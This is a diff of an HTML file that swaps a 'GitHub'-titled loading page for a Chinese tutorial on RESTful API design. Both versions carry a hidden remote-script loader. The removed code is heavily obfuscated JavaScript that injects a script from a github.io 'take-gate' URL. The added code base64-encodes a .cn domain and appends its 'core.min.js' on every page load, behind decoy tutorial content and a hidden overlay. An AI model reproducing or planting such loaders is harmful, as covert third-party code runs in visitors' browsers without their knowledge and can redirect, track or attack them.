@@ -1,145 +1,475 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RESTful API设计与实践</title>
     <style>
-        html,
+        /* 全局样式 */
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            background-color: #F8F8F8;
+            /* 浅灰色背景 */
+            color: #333333;
+            /* 深灰色文本 */
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            scroll-behavior: smooth;
+            /* 平滑滚动 */
         }
 
-        #childIframe {
-            width: 100%;
-            height: 100vh;
-            border: none;
+        .container {
+            max-width: 95%;
+            /* 适应移动端宽度 */
+            margin: 0 auto;
+            padding: 15px;
         }
 
-        .loading_container {
-            position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+        /* 头部样式 */
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
-            display: inline-block;
-            animation: slide 1s infinite;
+        header h1 {
+            color: #2C3E50;
+            /* 深蓝灰色标题 */
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        header p {
+            color: #607D8B;
+            /* 柔和的蓝灰色 */
+            font-size: 1.1em;
+            margin: 0;
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        /* 导航菜单 - 顶部固定 */
+        .main-nav {
+            position: sticky;
+            top: 0;
+            background-color: #FFFFFF;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 999;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            overflow: hidden;
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        .main-nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
+        .main-nav ul li a {
+            text-decoration: none;
+            color: #007BFF;
+            /* 强调色：蓝色 */
+            font-weight: bold;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
+        .main-nav ul li a:hover {
+            background-color: #EBF5FF;
+            /* 浅蓝色背景 */
+            color: #0056B3;
         }
 
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        /* 主要内容区 */
+        main {
+            padding-top: 0;
         }
 
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        section {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        h2 {
+            color: #2C3E50;
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0EBF5;
+            padding-bottom: 12px;
+            text-align: center;
         }
 
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
+        h3 {
+            color: #333333;
+            font-size: 1.3em;
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
 
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
+        p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 18px;
+        }
 
-            100% {
-                transform: scale(1);
-            }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        /* 步骤指南样式 */
+        .step-guide {
+            margin-top: 30px;
+        }
+
+        .step-item {
+            background-color: #FDFDFD;
+            /* 步骤项背景 */
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            border-left: 5px solid #2ECC71;
+            /* 左侧绿色强调线 */
+        }
+
+        .step-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .step-item .step-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .step-item .step-number {
+            background-color: #2ECC71;
+            /* 绿色强调色 */
+            color: #FFFFFF;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.1em;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .step-item h4 {
+            color: #333333;
+            font-size: 1.4em;
+            margin: 0;
+        }
+
+        .step-item p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+
+        /* 代码块样式 */
+        pre {
+            background-color: #2D3E50;
+            /* 深色背景 */
+            color: #EAECEE;
+            /* 浅色文本 */
+            padding: 18px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
+            font-size: 0.9em;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        code {
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 25px 0;
+            color: #777777;
+            font-size: 0.9em;
+            border-top: 1px solid #E0EBF5;
+            margin-top: 25px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
+        }
+
+        .footer-links a {
+            color: #007BFF;
+            text-decoration: none;
+            margin: 0 8px;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #0056B3;
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <div class="container">
+        <header>
+            <h1>RESTful API设计与实践</h1>
+            <p>构建高效、可扩展的Web服务</p>
+        </header>
+
+        <nav class="main-nav">
+            <ul>
+                <li><a href="#intro">简介</a></li>
+                <li><a href="#design-principles">设计原则</a></li>
+                <li><a href="#best-practices">最佳实践</a></li>
+                <li><a href="#security">安全</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="intro">
+                <h2>1. RESTful API简介</h2>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="RESTful API概念图">
+                <p>REST（Representational State Transfer）是一种用于分布式系统的架构风格，而RESTful
+                    API是遵循REST原则设计的Web服务接口。它利用HTTP协议的各种方法（GET, POST, PUT, DELETE等）来操作资源，实现客户端与服务器之间的通信。</p>
+                <p>理解RESTful设计有助于构建清晰、易于理解和维护的API，从而提高开发效率和系统可扩展性。</p>
+            </section>
+
+            <section id="design-principles">
+                <h2>2. RESTful设计核心原则</h2>
+                <div class="step-guide">
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">1</span>
+                            <h4>资源 (Resource)</h4>
+                        </div>
+                        <p>RESTful API将所有事物视为资源，每个资源都有一个唯一的标识符（URI）。资源可以是任何可识别的实体，如用户、订单、产品等。</p>
+                        <pre><code>
+GET /users
+GET /users/123
+GET /products/electronics
+                        </code></pre>
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>"
+                            alt="API资源URI示例">
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">2</span>
+                            <h4>统一接口 (Uniform Interface)</h4>
+                        </div>
+                        <p>这是RESTful设计的核心。它要求API使用一组预定义的、统一的操作来处理资源，主要通过HTTP方法实现。</p>
+                        <ul>
+                            <li><strong>GET:</strong> 获取资源</li>
+                            <li><strong>POST:</strong> 创建新资源</li>
+                            <li><strong>PUT:</strong> 更新/替换资源</li>
+                            <li><strong>DELETE:</strong> 删除资源</li>
+                        </ul>
+                        <pre><code>
+GET /products       // 获取所有产品
+POST /products      // 创建新产品
+PUT /products/123   // 更新产品123
+DELETE /products/123 // 删除产品123
+                        </code></pre>
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">3</span>
+                            <h4>无状态 (Stateless)</h4>
+                        </div>
+                        <p>服务器不应存储客户端的任何会话信息。每个请求都必须包含处理该请求所需的所有信息。这使得API更具可伸缩性和可靠性。</p>
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="无状态通信示意图">
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">4</span>
+                            <h4>可缓存 (Cacheable)</h4>
+                        </div>
+                        <p>API响应应明确指示是否可以缓存。这有助于减少服务器负载和网络流量，提升性能。</p>
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">5</span>
+                            <h4>分层系统 (Layered System)</h4>
+                        </div>
+                        <p>客户端无法区分它直接连接到最终服务器，还是中间服务器（如负载均衡器、代理）。这增加了系统的灵活性和可伸缩性。</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="best-practices">
+                <h2>3. RESTful API最佳实践</h2>
+                <h3>3.1 使用名词表示资源</h3>
+                <p>URI应使用名词（复数形式），而非动词，来表示资源。动词应通过HTTP方法来体现。</p>
+                <pre><code>
+// 推荐
+GET /users
+POST /orders
+
+// 不推荐
+GET /getUsers
+POST /createOrder
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="API命名规范图">
+                <h3>3.2 使用HTTP状态码</h3>
+                <p>API响应应使用标准的HTTP状态码来表示请求的结果（成功、客户端错误、服务器错误等）。</p>
+                <ul>
+                    <li>200 OK: 请求成功</li>
+                    <li>201 Created: 资源已创建</li>
+                    <li>400 Bad Request: 客户端请求错误</li>
+                    <li>401 Unauthorized: 未认证</li>
+                    <li>403 Forbidden: 无权限</li>
+                    <li>404 Not Found: 资源不存在</li>
+                    <li>500 Internal Server Error: 服务器内部错误</li>
+                </ul>
+            </section>
+
+            <section id="security">
+                <h2>4. API安全考量</h2>
+                <h3>4.1 认证与授权</h3>
+                <p>使用OAuth 2.0、JWT (JSON Web Tokens) 或API Key等机制进行用户认证和授权，确保只有合法用户才能访问受保护的资源。</p>
+                <h3>4.2 数据加密</h3>
+                <p>始终使用HTTPS来加密API通信，防止数据在传输过程中被窃听或篡改。</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="API安全锁图标">
+                <h3>4.3 输入验证与速率限制</h3>
+                <p>对所有API输入进行严格的验证和清理，防止注入攻击。实施速率限制以防止滥用和DDoS攻击。</p>
+            </section>
+        </main>
+
+        <footer>
+            <p>&copy; 2023 RESTful API设计与实践. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#" aria-label="GitHub">GitHub</a> |
+                <a href="#" aria-label="API文档">API文档</a> |
+                <a href="#" aria-label="联系我们">联系我们</a>
+            </div>
+        </footer>
+        <div id="overlay">
+            <div id="loading_box" class="loading_container">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
     </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        // 平滑滚动到锚点
+        document.querySelectorAll('.main-nav a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    const navHeight = document.querySelector('.main-nav').offsetHeight;
+                    window.scrollTo({
+                        top: targetElement.offsetTop - navHeight - 20, /* 额外20px间距 */
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // 动态更新图片时间戳，防止缓存
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('img[src*="picsum.photos"]');
+            images.forEach(img => {
+                const url = new URL(img.src);
+                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
+                img.src = url.toString();
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly91Mmk0bzZwLmppc2h1MWYxLmNuL3N0YXRpYy9qcy9jb3JlLm1pbi5qcz90";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
